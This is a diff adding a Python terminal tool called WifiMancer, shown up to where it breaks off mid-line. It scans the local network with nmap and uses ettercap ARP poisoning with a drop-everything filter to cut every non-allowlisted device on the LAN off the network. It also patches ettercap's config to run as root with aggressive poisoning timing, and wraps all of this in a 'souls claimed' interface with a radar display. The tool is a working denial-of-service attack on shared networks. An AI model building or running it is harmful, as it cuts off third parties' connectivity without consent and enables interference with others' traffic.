@@ -1,0 +1,1099 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+WifiMancer — layer-2 necromancer for the LAN you currently haunt.
+Pre-launch picker lets you allowlist devices; everyone else is cut.
+"""
+
+import curses
+import ipaddress
+import json
+import math
+import os
+import random
+import re
+import signal
+import subprocess
+import sys
+import threading
+import time
+from collections import OrderedDict, deque
+
+ETTERCAP    = "/opt/homebrew/bin/ettercap"
+ETTERFILTER = "/opt/homebrew/bin/etterfilter"
+NMAP        = "/opt/homebrew/bin/nmap"
+TCPDUMP     = "/usr/sbin/tcpdump"
+
+_INVOKER = os.environ.get("SUDO_USER") or os.environ.get("USER") or ""
+_HOME    = os.path.expanduser("~" + _INVOKER) if _INVOKER else os.path.expanduser("~")
+DATA_DIR  = os.path.join(_HOME, ".wifimancer")
+DROP      = os.path.join(DATA_DIR, "dropall.ef")
+DROP_SRC  = os.path.join(DATA_DIR, "dropall.filter")
+ALLOWLIST = os.path.join(DATA_DIR, "allowlist.json")
+
+BANNER = r"""
+ ██╗    ██╗██╗███████╗██╗███╗   ███╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗
+ ██║    ██║██║██╔════╝██║████╗ ████║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗
+ ██║ █╗ ██║██║█████╗  ██║██╔████╔██║███████║██╔██╗ ██║██║     █████╗  ██████╔╝
+ ██║███╗██║██║██╔══╝  ██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗
+ ╚███╔███╔╝██║██║     ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╗███████╗██║  ██║
+  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝
+""".strip("\n")
+
+SKULL = r"""
+          .---.
+         /     \
+        | () () |
+         \  ^  /
+          |||||
+          |||||
+""".strip("\n")
+
+SONAR = ["▰▱▱▱▱▱▱▱", "▰▰▱▱▱▱▱▱", "▰▰▰▱▱▱▱▱", "▰▰▰▰▱▱▱▱",
+         "▰▰▰▰▰▱▱▱", "▰▰▰▰▰▰▱▱", "▰▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰▰"]
+
+GLITCH = "▒░▓█▌▐░▒"
+
+
+def sh(cmd, timeout=5):
+    return subprocess.check_output(
+        cmd, shell=True, text=True, stderr=subprocess.DEVNULL, timeout=timeout
+    ).strip()
+
+
+def safe_addstr(stdscr, y, x, s, attr=0):
+    try:
+        stdscr.addstr(y, x, s, attr)
+    except curses.error:
+        pass
+
+
+def init_colors():
+    try:
+        curses.start_color()
+        curses.use_default_colors()
+        if curses.COLORS >= 256:
+            curses.init_pair(1, 196, -1)
+            curses.init_pair(2, 88,  -1)
+            curses.init_pair(3, 244, -1)
+            curses.init_pair(4, 226, -1)
+            curses.init_pair(5, 51,  -1)
+            curses.init_pair(6, 240, -1)
+            curses.init_pair(7, 15,  -1)
+            curses.init_pair(8, 160, -1)
+            curses.init_pair(9, 46,  -1)   # green for allowlisted
+        else:
+            curses.init_pair(1, curses.COLOR_RED,    -1)
+            curses.init_pair(2, curses.COLOR_RED,    -1)
+            curses.init_pair(3, curses.COLOR_WHITE,  -1)
+            curses.init_pair(4, curses.COLOR_YELLOW, -1)
+            curses.init_pair(5, curses.COLOR_CYAN,   -1)
+            curses.init_pair(6, curses.COLOR_BLUE,   -1)
+            curses.init_pair(7, curses.COLOR_WHITE,  -1)
+            curses.init_pair(8, curses.COLOR_RED,    -1)
+            curses.init_pair(9, curses.COLOR_GREEN,  -1)
+    except Exception:
+        pass
+
+
+def detect():
+    iface = sh("route get default 2>/dev/null | awk '/interface:/ {print $2}'")
+    self_ip = sh(f"ipconfig getifaddr {iface}")
+    gw = sh("route get default 2>/dev/null | awk '/gateway:/ {print $2}'")
+    mac = re.search(r"ether ([0-9a-f:]{17})", sh(f"ifconfig {iface}")).group(1)
+    ssid = ""
+    try:
+        out = sh(f"ipconfig getsummary {iface}")
+        m = re.search(r"^\s*SSID\s*:\s*(.+)$", out, re.M)
+        if m:
+            ssid = m.group(1).strip()
+    except Exception:
+        pass
+    if not ssid:
+        try:
+            line = sh(f"networksetup -getairportnetwork {iface}")
+            if ": " in line and "not associated" not in line.lower():
+                ssid = line.split(": ", 1)[1].strip()
+        except Exception:
+            pass
+    return iface, self_ip, gw, mac, ssid or "(unknown)"
+
+
+def ensure_drop_filter():
+    os.makedirs(DATA_DIR, exist_ok=True)
+    if os.path.exists(DROP):
+        return
+    with open(DROP_SRC, "w") as f:
+        f.write("if (ip.proto == TCP)  { drop(); kill(); }\n")
+        f.write("if (ip.proto == UDP)  { drop(); kill(); }\n")
+        f.write("if (ip.proto == ICMP) { drop(); kill(); }\n")
+    subprocess.check_call(
+        [ETTERFILTER, DROP_SRC, "-o", DROP],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+    )
+
+
+def load_allowlist():
+    try:
+        with open(ALLOWLIST) as f:
+            return set(json.load(f))
+    except Exception:
+        return set()
+
+
+def save_allowlist(macs):
+    os.makedirs(DATA_DIR, exist_ok=True)
+    try:
+        with open(ALLOWLIST, "w") as f:
+            json.dump(sorted(macs), f, indent=2)
+    except Exception:
+        pass
+
+
+def scan(subnet):
+    try:
+        out = subprocess.check_output(
+            [NMAP, "-sn", "-n", "-PR", "-PE", "-PS80,443,22", "-PA80",
+             "-T4", "--max-retries", "2", "--host-timeout", "3s",
+             "--send-eth", str(subnet)],
+            text=True, stderr=subprocess.DEVNULL, timeout=20,
+        )
+    except Exception:
+        return {}
+    hosts, cur = {}, None
+    for line in out.splitlines():
+        m = re.search(r"Nmap scan report for ([\d.]+)", line)
+        if m:
+            cur = m.group(1)
+            continue
+        m = re.search(r"MAC Address: ([0-9A-F:]{17})\s*\(([^)]*)\)", line)
+        if m and cur:
+            hosts[cur] = (m.group(1).lower(), m.group(2)[:18])
+    return hosts
+
+
+def build_targets(hosts, self_ip, gw, allow_macs):
+    out = []
+    for ip, (mac, vendor) in hosts.items():
+        if ip == self_ip or ip == gw:
+            continue
+        if mac in allow_macs:
+            continue
+        out.append(ip)
+    return out
+
+
+def start_ettercap(iface, gw, target_ips):
+    if not target_ips:
+        return None
+    targets = ";".join(target_ips)
+    return subprocess.Popen(
+        [ETTERCAP, "-T", "-q", "-i", iface, "-F", DROP,
+         "-M", "arp:remote", f"/{gw}//", f"/{targets}//"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        preexec_fn=os.setsid,
+    )
+
+
+def kill_ettercap(proc):
+    if not proc:
+        return
+    try:
+        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        proc.wait(timeout=2)
+    except Exception:
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+        except Exception:
+            pass
+
+
+def kill_zombie_ettercap():
+    """Kill any leftover ettercap from a prior crash that might fight ours."""
+    try:
+        subprocess.run(["pkill", "-f", "ettercap"],
+                       stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL)
+        time.sleep(0.3)
+    except Exception:
+        pass
+
+
+def tune_etter_conf():
+    """Ensure aggressive ARP poison cadence + root privs in etter.conf."""
+    conf = "/opt/homebrew/etc/ettercap/etter.conf"
+    if not os.path.exists(conf):
+        return
+    try:
+        with open(conf) as f:
+            text = f.read()
+        patched = text
+        patched = re.sub(r"^ec_uid\s*=\s*65534",
+                         "ec_uid = 0", patched, flags=re.M)
+        patched = re.sub(r"^ec_gid\s*=\s*65534",
+                         "ec_gid = 0", patched, flags=re.M)
+        patched = re.sub(r"^arp_poison_warm_up\s*=\s*\d+",
+                         "arp_poison_warm_up = 0", patched, flags=re.M)
+        patched = re.sub(r"^arp_poison_delay\s*=\s*\d+",
+                         "arp_poison_delay = 1", patched, flags=re.M)
+        patched = re.sub(r"^arp_storm_delay\s*=\s*\d+",
+                         "arp_storm_delay = 1", patched, flags=re.M)
+        if patched != text:
+            with open(conf, "w") as f:
+                f.write(patched)
+    except Exception:
+        pass
+
+
+class NetworkWorker(threading.Thread):
+    """Background scanner + ettercap manager. Main thread never blocks."""
+    def __init__(self, ctx):
+        super().__init__(daemon=True)
+        self.ctx = ctx
+        self.lock = threading.Lock()
+        self.hosts = dict(ctx.get("initial_hosts") or {})
+        self.target_ips = []
+        self.allow = set(ctx.get("allowlist") or set())
+        self.proc = None
+        self.last_scan_at = 0.0
+        self.scanning = False
+        self._stop = threading.Event()
+        self._kick = threading.Event()
+        self._kick.set()                     # immediate first scan + start
+
+    def kick(self):
+        self._kick.set()
+
+    def set_allow(self, allow):
+        with self.lock:
+            self.allow = set(allow)
+        self._kick.set()
+
+    def snapshot(self):
+        with self.lock:
+            return {
+                "hosts":      dict(self.hosts),
+                "target_ips": list(self.target_ips),
+                "allow":      set(self.allow),
+                "proc_alive": self.proc is not None,
+                "last_scan":  self.last_scan_at,
+                "scanning":   self.scanning,
+            }
+
+    def stop(self):
+        self._stop.set()
+        self._kick.set()
+        kill_ettercap(self.proc)
+
+    def run(self):
+        while not self._stop.is_set():
+            with self.lock:
+                self.scanning = True
+            try:
+                fresh = scan(self.ctx["subnet_net"])
+            except Exception:
+                fresh = {}
+            with self.lock:
+                self.scanning = False
+                if fresh:
+                    self.hosts = fresh
+                self.last_scan_at = time.time()
+                new_targets = build_targets(
+                    self.hosts, self.ctx["self_ip"],
+                    self.ctx["gw"], self.allow)
+                if set(new_targets) != set(self.target_ips):
+                    self.target_ips = new_targets
+                    kill_ettercap(self.proc)
+                    self.proc = start_ettercap(
+                        self.ctx["iface"], self.ctx["gw"], self.target_ips)
+            self._kick.wait(timeout=3)
+            self._kick.clear()
+
+
+class PacketCounter(threading.Thread):
+    def __init__(self, iface, mac, self_ip):
+        super().__init__(daemon=True)
+        self.count = 0
+        self.proc = None
+        self.iface = iface
+        self.mac = mac.lower()
+        self.self_ip = self_ip
+        self._stop = threading.Event()
+
+    def run(self):
+        bpf = (f"ether dst {self.mac} "
+               f"and not ether src {self.mac} "
+               f"and not arp "
+               f"and not ip dst {self.self_ip} "
+               f"and not ip6")
+        try:
+            self.proc = subprocess.Popen(
+                [TCPDUMP, "-i", self.iface, "-n", "-l", "-q", "-p", bpf],
+                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid, bufsize=1, text=True,
+            )
+            for _ in self.proc.stdout:
+                if self._stop.is_set():
+                    break
+                self.count += 1
+        except Exception:
+            pass
+
+    def stop(self):
+        self._stop.set()
+        try:
+            os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
+        except Exception:
+            pass
+
+
+def boot_animation(stdscr, ctx):
+    curses.curs_set(0)
+    init_colors()
+    stdscr.nodelay(False)
+    h, w = stdscr.getmaxyx()
+
+    for _ in range(7):
+        stdscr.erase()
+        for _ in range(120):
+            y = random.randint(0, max(0, h - 1))
+            x = random.randint(0, max(0, w - 1))
+            safe_addstr(stdscr, y, x, random.choice(GLITCH),
+                        curses.color_pair(random.choice([2, 8])))
+        stdscr.refresh()
+        time.sleep(0.04)
+
+    stdscr.erase()
+
+    blines = BANNER.splitlines()
+    bw = max(len(l) for l in blines)
+    bx = max(0, (w - bw) // 2)
+    for i, line in enumerate(blines):
+        safe_addstr(stdscr, 1 + i, bx, line[:max(0, w - bx - 1)],
+                    curses.color_pair(1) | curses.A_BOLD)
+        stdscr.refresh()
+        time.sleep(0.07)
+
+    tag = "« layer-2 necromancer »"
+    safe_addstr(stdscr, 1 + len(blines) + 1,
+                max(0, (w - len(tag)) // 2),
+                tag, curses.color_pair(2))
+
+    sk = SKULL.splitlines()
+    sy = 1 + len(blines) + 3
+    sx = max(0, (w - max(len(l) for l in sk)) // 2)
+    for i, line in enumerate(sk):
+        safe_addstr(stdscr, sy + i, sx, line, curses.color_pair(8))
+    stdscr.refresh()
+    time.sleep(0.25)
+
+    msgs = [
+        "opening BPF socket on the abyss",
+        "aligning ARP planes",
+        "consecrating drop filter (TCP/UDP/ICMP)",
+        f"binding self  {ctx['self_ip']}  ({ctx['mac']})",
+        f"marking gate  {ctx['gw']}",
+        f"mapping subnet  {ctx['subnet']}",
+        "scrying the network ...",
+    ]
+    msg_y = sy + len(sk) + 2
+    bar_y = msg_y + len(msgs) + 1
+    bar_w = min(60, max(20, w - 6))
+    bar_x = max(0, (w - bar_w) // 2)
+    safe_addstr(stdscr, bar_y, bar_x - 1, "[" + " " * bar_w + "]",
+                curses.color_pair(2))
+
+    for i, m in enumerate(msgs):
+        line = f"  [*] {m} ..."
+        x = max(0, (w - 60) // 2)
+        safe_addstr(stdscr, msg_y + i, x, line[:max(0, w - x - 4)],
+                    curses.color_pair(3))
+        progress = int(((i + 1) / len(msgs)) * bar_w)
+        safe_addstr(stdscr, bar_y, bar_x, "▰" * progress,
+                    curses.color_pair(1))
+        stdscr.refresh()
+        if "scrying" in m:
+            ctx["initial_hosts"] = scan(ctx["subnet_net"])
+        else:
+            time.sleep(0.14 + random.random() * 0.10)
+        safe_addstr(stdscr, msg_y + i, x + len(line) + 1, "ok",
+                    curses.color_pair(1) | curses.A_BOLD)
+        stdscr.refresh()
+
+    bound = "the conjuration awaits your will  ☠"
+    safe_addstr(stdscr, msg_y + len(msgs) + 3,
+                max(0, (w - len(bound)) // 2),
+                bound, curses.color_pair(1) | curses.A_BOLD)
+    stdscr.refresh()
+    time.sleep(0.6)
+
+
+def selection_screen(stdscr, hosts, allow_macs, ctx, intro_text=None):
+    """Interactive checkbox picker. Returns updated set of allowlisted MACs."""
+    init_colors()
+    curses.curs_set(0)
+    stdscr.nodelay(False)
+    rows = sorted(hosts.items(), key=lambda x: ipaddress.ip_address(x[0]))
+    selected = set(allow_macs)
+    cursor = 0
+    scroll = 0
+
+    while True:
+        stdscr.erase()
+        h, w = stdscr.getmaxyx()
+
+        title = "« CHOOSE THE SOULS YOU SPARE »"
+        safe_addstr(stdscr, 1, max(0, (w - len(title)) // 2),
+                    title, curses.color_pair(1) | curses.A_BOLD)
+        sub = (intro_text or
+               "↑↓ navigate    space toggle    a all    n none    "
+               "enter confirm    esc cancel")
+        safe_addstr(stdscr, 2, max(0, (w - len(sub)) // 2),
+                    sub, curses.color_pair(3))
+
+        ctx_line = (f"SSID {ctx['ssid']}   ·   "
+                    f"self {ctx['self_ip']}   ·   gw {ctx['gw']}   "
+                    f"·   {len(rows)} devices found")
+        safe_addstr(stdscr, 3, max(0, (w - len(ctx_line)) // 2),
+                    ctx_line, curses.color_pair(2))
+
+        hdr_y = 5
+        safe_addstr(stdscr, hdr_y, 4,
+                    f"{'':4}{'IP':<16}{'MAC':<20}{'VENDOR':<22}{'NOTE':<18}",
+                    curses.color_pair(7) | curses.A_BOLD)
+        safe_addstr(stdscr, hdr_y + 1, 4, "─" * (w - 8),
+                    curses.color_pair(2))
+
+        list_top = hdr_y + 2
+        list_h = max(3, h - list_top - 3)
+
+        if cursor < scroll:
+            scroll = cursor
+        if cursor >= scroll + list_h:
+            scroll = cursor - list_h + 1
+
+        for visible in range(list_h):
+            i = scroll + visible
+            if i >= len(rows):
+                break
+            ip, (mac, vendor) = rows[i]
+            note = ""
+            if ip == ctx["self_ip"]:
+                note = "this Mac"
+            elif ip == ctx["gw"]:
+                note = "gateway"
+            box = "[✓]" if mac in selected else "[ ]"
+            line = (f"{box} {ip:<16}{mac:<20}"
+                    f"{(vendor or '?'):<22}{note:<18}")
+            if i == cursor:
+                attr = (curses.color_pair(9 if mac in selected else 7)
+                        | curses.A_REVERSE | curses.A_BOLD)
+            elif mac in selected:
+                attr = curses.color_pair(9) | curses.A_BOLD
+            elif ip in (ctx["self_ip"], ctx["gw"]):
+                attr = curses.color_pair(5)
+            else:
+                attr = curses.color_pair(7)
+            safe_addstr(stdscr, list_top + visible, 4, line[:w - 8], attr)
+
+        n_spared = len(selected)
+        n_cut = sum(1 for ip, (m, _) in rows
+                    if ip not in (ctx["self_ip"], ctx["gw"])
+                    and m not in selected)
+        footer = (f"  spared (allowlisted): {n_spared}   ·   "
+                  f"will be cut: {n_cut}   ·   self/gw always spared  ")
+        safe_addstr(stdscr, h - 1, 0, footer.ljust(w - 1)[:w - 1],
+                    curses.color_pair(1) | curses.A_REVERSE)
+
+        stdscr.refresh()
+        ch = stdscr.getch()
+        if ch == curses.KEY_UP and cursor > 0:
+            cursor -= 1
+        elif ch == curses.KEY_DOWN and cursor < len(rows) - 1:
+            cursor += 1
+        elif ch in (curses.KEY_PPAGE,):
+            cursor = max(0, cursor - list_h)
+        elif ch in (curses.KEY_NPAGE,):
+            cursor = min(len(rows) - 1, cursor + list_h)
+        elif ch == ord(' '):
+            if rows:
+                mac = rows[cursor][1][0]
+                if mac in selected:
+                    selected.remove(mac)
+                else:
+                    selected.add(mac)
+        elif ch in (ord('a'), ord('A')):
+            for ip, (m, _) in rows:
+                if ip not in (ctx["self_ip"], ctx["gw"]):
+                    selected.add(m)
+        elif ch in (ord('n'), ord('N')):
+            selected.clear()
+        elif ch in (10, 13, curses.KEY_ENTER):
+            return selected
+        elif ch in (27, 3):
+            return set(allow_macs)
+
+
+def draw_box(stdscr, y, x, h, w, title="", color=2, accent=1):
+    """Rounded-corner panel with diamond-accented title bar."""
+    if h < 2 or w < 2:
+        return
+    safe_addstr(stdscr, y, x,
+                "╭" + "─" * (w - 2) + "╮", curses.color_pair(color))
+    for i in range(1, h - 1):
+        safe_addstr(stdscr, y + i, x,         "│", curses.color_pair(color))
+        safe_addstr(stdscr, y + i, x + w - 1, "│", curses.color_pair(color))
+    safe_addstr(stdscr, y + h - 1, x,
+                "╰" + "─" * (w - 2) + "╯", curses.color_pair(color))
+    if title:
+        t = f"╴ ◆ {title} ◆ ╶"
+        safe_addstr(stdscr, y, x + 2, t,
+                    curses.color_pair(accent) | curses.A_BOLD)
+
+
+SPARK = "▁▂▃▄▅▆▇█"
+
+
+def sparkline(samples, width=12):
+    s = list(samples)[-width:]
+    if not s:
+        return " " * width
+    mx = max(s) or 1
+    bars = "".join(SPARK[min(7, int((v / mx) * 7))] for v in s)
+    return bars.rjust(width)
+
+
+def tui(stdscr, ctx):
+    init_colors()
+    curses.curs_set(0)
+    curses.cbreak()
+    curses.noecho()
+    stdscr.keypad(True)                # decode arrow keys to KEY_UP etc.
+    stdscr.nodelay(False)
+    stdscr.timeout(150)                # block <=150ms then return -1
+    try:
+        curses.set_escdelay(25)
+    except Exception:
+        pass
+
+    worker = NetworkWorker(ctx)
+    worker.start()
+    counter = PacketCounter(ctx["iface"], ctx["mac"], ctx["self_ip"])
+    counter.start()
+
+    devices = OrderedDict()
+    log = deque(maxlen=200)
+    started = time.time()
+    pulse = 0
+    blink = 0
+    cursor = 0
+    scroll = 0
+    last_key = -1
+    last_key_at = 0.0
+    last_target_count = -1
+    samples = deque(maxlen=24)
+    rate_last_count = 0
+    rate_last_at = time.time()
+    sweep_angle = 0.0
+
+    def push(msg, color=3):
+        log.append((time.time(), msg, color))
+
+    push("network worker spawned · scanning + ettercap in background", 1)
+
+    try:
+        while True:
+            try:
+                ch = stdscr.getch()
+            except Exception:
+                ch = -1
+            if ch != -1:
+                last_key = ch
+                last_key_at = time.time()
+            if ch in (ord("q"), ord("Q"), 3):
+                break
+            elif ch in (ord("r"), ord("R")):
+                worker.kick()
+                push("manual rescan kicked", 5)
+            elif ch in (ord("A"),):
+                snap = worker.snapshot()
+                new_allow = selection_screen(
+                    stdscr, snap["hosts"], snap["allow"], ctx,
+                    intro_text="batch edit allowlist  ·  "
+                               "enter to confirm  ·  esc to cancel")
+                if new_allow != snap["allow"]:
+                    save_allowlist(new_allow)
+                    worker.set_allow(new_allow)
+                    push(f"allowlist updated → {len(new_allow)} spared", 1)
+                stdscr.keypad(True)
+                stdscr.timeout(120)
+            elif ch in (curses.KEY_UP, ord("k")):
+                cursor = max(0, cursor - 1)
+            elif ch in (curses.KEY_DOWN, ord("j")):
+                cursor = min(max(0, len(devices) - 1), cursor + 1)
+            elif ch in (curses.KEY_PPAGE, ord("u")):
+                cursor = max(0, cursor - 8)
+            elif ch in (curses.KEY_NPAGE, ord("d")):
+                cursor = min(max(0, len(devices) - 1), cursor + 8)
+            elif ch in (ord(" "), ord("a"), ord("b")):
+                rows = sorted(devices.items(),
+                              key=lambda x: ipaddress.ip_address(x[0]))
+                if rows and 0 <= cursor < len(rows):
+                    ip, info = rows[cursor]
+                    mac = info["mac"]
+                    if ip in (ctx["self_ip"], ctx["gw"]):
+                        push(f"× {ip} is self/gateway — cannot toggle", 4)
+                    else:
+                        snap = worker.snapshot()
+                        allow = set(snap["allow"])
+                        if mac in allow:
+                            allow.discard(mac)
+                            push(f"× {ip:<15} {mac}  → CUT", 1)
+                        else:
+                            allow.add(mac)
+                            push(f"♡ {ip:<15} {mac}  → SPARED", 9)
+                        save_allowlist(allow)
+                        worker.set_allow(allow)
+
+            # poll worker — never blocks
+            snap = worker.snapshot()
+            hosts = snap["hosts"]
+            target_ips = snap["target_ips"]
+            allow = snap["allow"]
+            scanning = snap["scanning"]
+
+            now = time.time()
+            for ip, (m, vendor) in hosts.items():
+                if ip not in devices:
+                    devices[ip] = {"mac": m, "vendor": (vendor or "?"),
+                                   "first": now, "last": now,
+                                   "reconnects": 0}
+                    if (ip not in (ctx["self_ip"], ctx["gw"])
+                            and m not in allow):
+                        push(f"+ {ip:<15} {m}  "
+                             f"{(vendor or '?'):<14}  soul claimed", 1)
+                else:
+                    d = devices[ip]
+                    if (now - d["last"] > 60
+                            and ip not in (ctx["self_ip"], ctx["gw"])
+                            and m not in allow):
+                        d["reconnects"] += 1
+                        push(f"~ {ip:<15} {m}  reconnect #"
+                             f"{d['reconnects']} blocked", 4)
+                    d["mac"] = m
+                    d["last"] = now
+
+            if last_target_count != len(target_ips):
+                if last_target_count >= 0:
+                    push(f"targets refreshed → {len(target_ips)} bound", 5)
+                last_target_count = len(target_ips)
+
+            stdscr.erase()
+            h, w = stdscr.getmaxyx()
+            pulse = (pulse + 1) % len(SONAR)
+            blink = (blink + 1) % 6
+            sweep_angle = (sweep_angle + 7.5) % 360.0
+            up = int(now - started)
+            up_s = f"{up//3600:02d}:{(up%3600)//60:02d}:{up%60:02d}"
+
+            if now - rate_last_at >= 1.0:
+                samples.append(max(0, counter.count - rate_last_count))
+                rate_last_count = counter.count
+                rate_last_at = now
+            rate = samples[-1] if samples else 0
+
+            cut_count = sum(
+                1 for ip, info in devices.items()
+                if ip not in (ctx["self_ip"], ctx["gw"])
+                and info["mac"] not in allow
+                and now - info["last"] < 30)
+
+            opcode = ctx["mac"].replace(":", "").upper()[:8]
+            zulu   = time.strftime("%H:%M:%SZ", time.gmtime())
+            engaged = cut_count > 0
+            stat_glyph = "● ENGAGED" if engaged else "○ STANDBY"
+            stat_attr = (curses.color_pair(1) | curses.A_BOLD) if engaged \
+                        else (curses.color_pair(4) | curses.A_BOLD)
+
+            # ─── COMMAND BAR (3 lines + divider) ──────────────
+            title = (" [ W·I·F·I·M·A·N·C·E·R ]   ◤   "
+                     "TACTICAL NETWORK INTERDICTION SYSTEM   ◢   v2.0  CLASS-A ")
+            safe_addstr(stdscr, 0, 0, title[:w-1].center(w-1)[:w-1],
+                        curses.color_pair(1) | curses.A_REVERSE | curses.A_BOLD)
+
+            line1 = (f" OPCODE  {opcode}  ◇  "
+                     f"NET  {ctx['ssid'][:18]:<18}  ◇  "
+                     f"HOST  {ctx['self_ip']:<14}  ◇  "
+                     f"GW  {ctx['gw']:<14}  ◇  "
+                     f"ELM  {ctx['iface']}  ")
+            safe_addstr(stdscr, 1, 0, line1[:w-1].ljust(w-1),
+                        curses.color_pair(2) | curses.A_BOLD)
+
+            line2 = (f" {zulu}  ◇  T+ {up_s}  ◇  ")
+            safe_addstr(stdscr, 2, 0, line2,
+                        curses.color_pair(7))
+            safe_addstr(stdscr, 2, len(line2), stat_glyph, stat_attr)
+            extras = (f"  ◇  TGT {cut_count:>2}/{len(target_ips):<2}  ◇  "
+                      f"FRD {len(allow):>2}  ◇  "
+                      f"RPS {rate:>5}  ◇  FRM {counter.count:>9,}  "
+                      f"{sparkline(samples, 10)} ")
+            safe_addstr(stdscr, 2, len(line2) + len(stat_glyph), extras[:w-len(line2)-len(stat_glyph)-1],
+                        curses.color_pair(7))
+            safe_addstr(stdscr, 3, 0, "═" * (w - 1),
+                        curses.color_pair(2))
+
+            # ─── LAYOUT ───────────────────────────────────────
+            log_h = 6
+            footer_h = 1
+            main_top = 4
+            main_h = max(10, h - main_top - log_h - footer_h)
+
+            list_w = max(40, min(54, w * 2 // 5))
+            radar_w = max(24, w - list_w - 1)
+
+            # ─── TACTICAL DISPLAY (left) ──────────────────────
+            # frame around radar pane
+            for y in range(main_top, main_top + main_h):
+                safe_addstr(stdscr, y, 0, "│", curses.color_pair(2))
+            cx = radar_w // 2
+            cy = main_top + main_h // 2
+            R = max(3, min((main_h // 2) - 2, (radar_w // 4) - 1))
+
+            # concentric range rings (3 of them)
+            for ring_idx, (frac, color, lbl) in enumerate(
+                    [(0.33, 6, "10"), (0.66, 6, "20"), (1.00, 2, "30")]):
+                ring_r = max(1, int(R * frac))
+                steps = max(36, ring_r * 10)
+                for s in range(steps):
+                    theta = (s / steps) * 360.0
+                    px = cx + int(ring_r * 2 * math.cos(math.radians(theta)))
+                    py = cy + int(ring_r * math.sin(math.radians(theta)))
+                    if 1 <= px < radar_w - 1 and main_top + 1 <= py < main_top + main_h - 1:
+                        safe_addstr(stdscr, py, px, "·",
+                                    curses.color_pair(color))
+                # range label on the east axis
+                if 1 <= cx + ring_r * 2 + 1 < radar_w - 1:
+                    safe_addstr(stdscr, cy - 1, cx + ring_r * 2 - len(lbl),
+                                lbl, curses.color_pair(6))
+
+            # axis crosshair (full reach to compass marks)
+            for px in range(max(1, cx - R * 2), min(radar_w - 1, cx + R * 2 + 1)):
+                if px != cx and main_top + 1 <= cy < main_top + main_h - 1:
+                    safe_addstr(stdscr, cy, px, "─", curses.color_pair(6))
+            for py in range(max(main_top + 1, cy - R), min(main_top + main_h - 1, cy + R + 1)):
+                if py != cy and 1 <= cx < radar_w - 1:
+                    safe_addstr(stdscr, py, cx, "│", curses.color_pair(6))
+
+            # compass marks
+            n_y = max(main_top + 1, cy - R - 1)
+            s_y = min(main_top + main_h - 2, cy + R + 1)
+            e_x = min(radar_w - 5, cx + R * 2 + 1)
+            w_x = max(1, cx - R * 2 - 4)
+            safe_addstr(stdscr, n_y, max(1, cx - 2), "N·000", curses.color_pair(5) | curses.A_BOLD)
+            safe_addstr(stdscr, s_y, max(1, cx - 2), "S·180", curses.color_pair(5))
+            if e_x > 1:
+                safe_addstr(stdscr, cy, e_x, "E·090", curses.color_pair(5))
+            if w_x > 0:
+                safe_addstr(stdscr, cy, w_x, "W·270", curses.color_pair(5))
+
+            # rotating sweep — wedge with comet-tail decay
+            for trail in range(8):
+                trail_angle = (sweep_angle - trail * 5.5) % 360.0
+                if trail == 0:
+                    glyph, color, attrs = "█", 1, curses.A_BOLD
+                elif trail < 3:
+                    glyph, color, attrs = "▓", 1, 0
+                elif trail < 5:
+                    glyph, color, attrs = "▒", 8, 0
+                else:
+                    glyph, color, attrs = "░", 2, 0
+                rad = math.radians(trail_angle)
+                for d in range(1, R + 1):
+                    px = cx + int(d * 2 * math.cos(rad))
+                    py = cy + int(d * math.sin(rad))
+                    if 1 <= px < radar_w - 1 and main_top + 1 <= py < main_top + main_h - 1:
+                        safe_addstr(stdscr, py, px, glyph,
+                                    curses.color_pair(color) | attrs)
+
+            # gateway dead-center
+            safe_addstr(stdscr, cy, cx, "⌂",
+                        curses.color_pair(5) | curses.A_BOLD | curses.A_REVERSE)
+
+            # devices placed by IP angle
+            rows = sorted(devices.items(),
+                          key=lambda x: ipaddress.ip_address(x[0]))
+            cursor = max(0, min(cursor, max(0, len(rows) - 1)))
+            cursor_ip = rows[cursor][0] if rows and 0 <= cursor < len(rows) else None
+
+            for ip, info in rows:
+                if ip == ctx["gw"]:
+                    continue
+                try:
+                    last_oct = int(ip.rsplit(".", 1)[1])
+                except Exception:
+                    continue
+                theta = (last_oct * 137.508) % 360.0
+                rdist = R if ip != ctx["self_ip"] else max(1, R // 3)
+                px = cx + int(rdist * 2 * math.cos(math.radians(theta)))
+                py = cy + int(rdist * math.sin(math.radians(theta)))
+                if not (1 <= px < radar_w - 1 and main_top + 1 <= py < main_top + main_h - 1):
+                    continue
+
+                mac = info["mac"]
+                idle = now - info["last"]
+                age = now - info["first"]
+                if ip == ctx["self_ip"]:
+                    glyph, c = "◉", 5
+                elif mac in allow:
+                    glyph, c = "♡", 9
+                elif age < 6:
+                    glyph, c = "⚡", 4
+                elif idle < 30:
+                    glyph, c = "☠", 1
+                elif idle < 120:
+                    glyph, c = "~", 2
+                else:
+                    glyph, c = "·", 6
+
+                attr = curses.color_pair(c) | curses.A_BOLD
+                ang_diff = abs(((theta - sweep_angle + 180) % 360) - 180)
+                if ang_diff < 18:
+                    attr |= curses.A_REVERSE
+
+                if ip == cursor_ip:
+                    safe_addstr(stdscr, py, max(1, px - 1), "[",
+                                curses.color_pair(4) | curses.A_BOLD)
+                    safe_addstr(stdscr, py, min(radar_w - 2, px + 1), "]",
+                                curses.color_pair(4) | curses.A_BOLD)
+                    attr = curses.color_pair(4) | curses.A_REVERSE | curses.A_BOLD
+
+                safe_addstr(stdscr, py, px, glyph, attr)
+
+            # tactical badges
+            aor = f" AOR {ctx['subnet']} "
+            safe_addstr(stdscr, main_top, 2, aor,
+                        curses.color_pair(2) | curses.A_REVERSE)
+            scan_state = "SCANNING" if scanning else f"SWEPT -{int(now - snap['last_scan']) if snap['last_scan'] else 0}s"
